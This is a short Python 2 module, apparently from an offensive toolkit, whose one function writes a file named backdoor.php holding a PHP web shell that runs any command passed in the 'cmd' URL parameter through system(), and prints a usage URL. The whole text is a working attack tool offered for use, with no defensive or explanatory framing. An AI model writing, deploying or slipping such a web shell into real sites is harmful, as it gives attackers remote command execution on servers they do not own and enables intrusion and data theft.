#!/usr/bin/python
"""backdoor module"""

from termcolor import colored


def php_backdoor():
    """Creates a backdoor in php"""
    print colored('Creating backdoor.php', 'green')
    print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
    code = "<html> <?php system($_GET['cmd']);?> </html>"
    backdoor = open('backdoor.php', 'w')
    backdoor.write(code)
    backdoor.close()
